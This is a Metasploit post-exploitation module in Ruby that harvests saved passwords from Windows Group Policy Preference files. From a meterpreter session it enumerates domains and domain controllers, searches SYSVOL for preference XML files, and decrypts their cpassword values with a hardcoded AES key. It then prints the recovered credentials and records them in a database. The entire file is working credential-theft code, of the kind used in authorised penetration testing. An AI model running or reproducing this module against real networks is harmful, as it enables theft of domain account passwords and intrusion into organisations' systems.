##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'rexml/document'

class Metasploit3 < Msf::Post
	include Msf::Auxiliary::Report
	include Msf::Post::Windows::Priv

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Gather Group Policy Preference Saved Passwords',
			'Description'   => %q{
				This module enumerates the victim machine's domain controller and
				connects to it via SMB. It then looks for Group Policy Preference XML
				files containing local user accounts and passwords and decrypts them
				using Microsofts public AES key.

				Tested on WinXP SP3 Client and Win2k8 R2 DC.
			},
			'License'       => MSF_LICENSE,
			'Author'        =>[
				'Ben Campbell <eat_meatballs[at]hotmail.co.uk>',
				'Loic Jaquemet <loic.jaquemet+msf[at]gmail.com>',
				'scriptmonkey <scriptmonkey[at]owobble.co.uk>',
				'TheLightCosine <thelightcosine[at]metasploit.com>',
				'Rob Fuller <mubix[at]hak5.org>' #domain/dc enumeration code
				],
			'References'    =>
				[
					['URL', 'http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences'],
					['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)'],
					['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
					['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx']
				],
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

	end

	def run
		if is_system?
			print_error "This needs to be run as a Domain User, not SYSTEM"
			return nil
		end

		group_path = "MACHINE\\Preferences\\Groups\\Groups.xml"
		group_path_user = "USER\\Preferences\\Groups\\Groups.xml"
		service_path = "MACHINE\\Preferences\\Services\\Services.xml"
		printer_path = "USER\\Preferences\\Printers\\Printers.xml"
		drive_path = "USER\\Preferences\\Drives\\Drives.xml"
		datasource_path = "MACHINE\\Preferences\\Datasources\\DataSources.xml"
		datasource_path_user = "USER\\Preferences\\Datasources\\DataSources.xml"
		task_path = "MACHINE\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
		task_path_user = "USER\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"

		windir = client.fs.file.expand_path("%SYSTEMROOT%\\SYSVOL")


		domains = []
		dcs = []
		basepaths = []
		fullpaths = []

		basepaths << get_basepaths(client.fs.file.expand_path("%SYSTEMROOT%\\SYSVOL"))

		domains = enum_domains
		domains.reject!{|n| n == "WORKGROUP"}
		domains.each{ |domain| dcs << enum_dcs(domain)}
		dcs.flatten!
		dcs.compact!
		dcs.each{ |dc| basepaths << get_basepaths("\\\\#{dc}\\SYSVOL") }

		basepaths.flatten!
		basepaths.compact!
		basepaths.each do |policy_path|
			fullpaths << find_path(policy_path, group_path)
			fullpaths << find_path(policy_path, group_path_user)
			fullpaths << find_path(policy_path, service_path)
			fullpaths << find_path(policy_path, printer_path)
			fullpaths << find_path(policy_path, drive_path)
			fullpaths << find_path(policy_path, datasource_path)
			fullpaths << find_path(policy_path, datasource_path_user)
			fullpaths << find_path(policy_path, task_path)
			fullpaths << find_path(policy_path, task_path_user)
		end
		fullpaths.flatten!
		fullpaths.compact!
		fullpaths.each do |filepath|
			tmpfile = gpp_xml_file(filepath)
			parse_xml(tmpfile) if tmpfile
		end

	end

	def get_basepaths(base)
		locals = []
		begin
			session.fs.dir.foreach(base) do |sub|
				next if sub =~ /^(\.|\.\.)$/
				tpath = "#{base}\\#{sub}\\Policies"
				begin 
					session.fs.dir.foreach(tpath) do |sub2|
						next if sub =~ /^(\.|\.\.)$/
						locals << "#{tpath}\\#{sub2}\\"
					end
				rescue Rex::Post::Meterpreter::RequestError => e
					print_error "Could not access #{tpath}  : #{e.message}"
				end
			end
		rescue Rex::Post::Meterpreter::RequestError => e
			print_error "Error accessing #{base} : #{e.message}"
		end
		return locals
	end


	def find_path(path, xml_path)
		xml_path = "#{path}\\#{xml_path}"
		begin
			return xml_path if client.fs.file.stat(xml_path)
		rescue Rex::Post::Meterpreter::RequestError => e
			# No permissions for this specific file.
			return nil
		end
	end

	def gpp_xml_file(path)
		begin
			groups = client.fs.file.new(path,'r')
			until groups.eof
				data = groups.read
			end

			spath = path.split('\\')
			retobj = {
				:domain => spath[2],
				:dc     => spath[0],
				:xml    => REXML::Document.new(data).root
			}	
			return retobj
		rescue Rex::Post::Meterpreter::RequestError => e
			print_error "Received error code #{e.code} when reading #{path}"
			return nil
		end
	end

	def parse_xml(xmlfile)
		mxml = xmlfile[:xml]
		mxml.elements.to_a("//Properties").each do |node|
			epassword = node.attributes['cpassword']
			next if epassword.to_s.empty?
			pass = decrypt(epassword)

			user = node.attributes['runAs'] if node.attributes['runAs']
			user = node.attributes['accountName'] if node.attributes['accountName']
			user = node.attributes['username'] if  node.attributes['username']
			user = node.attributes['userName'] if  node.attributes['userName']

			print_good "DOMAIN CONTROLLER: #{xmlfile[:dc]} DOMAIN: #{xmlfile[:domain]} USER: #{user} PASS: #{pass} "
			report_creds(user,pass)
		end
	end


	def report_creds(user, pass)
		if session.db_record
			source_id = session.db_record.id
		else
			source_id = nil
		end

		report_auth_info(
			:host  => session.sock.peerhost,
			:port => 445,
			:sname => 'smb',
			:proto => 'tcp',
			:source_id => source_id,
			:source_type => "exploit",
			:user => user,
			:pass => pass)
	end

	def decrypt(encrypted_data)
		padding = "=" * (4 - (encrypted_data.length % 4))
		epassword = "#{encrypted_data}#{padding}"
		decoded = Rex::Text.decode_base64(epassword)

		key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
		aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
		aes.decrypt
		aes.key = key
		plaintext = aes.update(decoded)
		plaintext << aes.final
		pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion

		return pass
	end


	def enum_domains
		print_status "Enumerating Domains on the Network..."
		domain_enum = 0x80000000 # SV_TYPE_DOMAIN_ENUM
		buffersize = 500
		result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
		# Estimate new buffer size on percentage recovered.
		percent_found = (result['entriesread'].to_f/result['totalentries'].to_f)
		if percent_found > 0
			buffersize = (buffersize/percent_found).to_i
		else
			buffersize += 500
		end

		while result['return'] == 234
			buffersize = buffersize + 500
			result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
		end

		count = result['totalentries']
		print_status("#{count} domain(s) found.")
		startmem = result['bufptr']

		base = 0
		domains = []

		if count == 0
			return domains
		end

		mem = client.railgun.memread(startmem, 8*count)

		count.times do |i|
				x = {}
				x[:platform] = mem[(base + 0),4].unpack("V*")[0]
				nameptr = mem[(base + 4),4].unpack("V*")[0]
				x[:domain] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
				domains << x[:domain]
				base = base + 8
		end

		return domains
	end

	def enum_dcs(domain)
		print_status("Enumerating DCs for #{domain}")
		domaincontrollers = 24  # 10 + 8 (SV_TYPE_DOMAIN_BAKCTRL || SV_TYPE_DOMAIN_CTRL)
		buffersize = 500
		result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domaincontrollers,domain,nil)
		while result['return'] == 234
			buffersize = buffersize + 500
			result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domaincontrollers,domain,nil)
		end
		if result['totalentries'] == 0
			print_error("No Domain Controllers found for #{domain}")
			return nil
		end

		count = result['totalentries']
		startmem = result['bufptr']

		base = 0
		mem = client.railgun.memread(startmem, 8*count)
		hostnames = []
		count.times{|i|
			t = {}
			t[:platform] = mem[(base + 0),4].unpack("V*")[0]
			nameptr = mem[(base + 4),4].unpack("V*")[0]
			t[:dc_hostname] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
			base = base + 8
			print_good "DC Found: #{t[:dc_hostname]}"
			hostnames << t[:dc_hostname]
		}
		return hostnames
	end

end
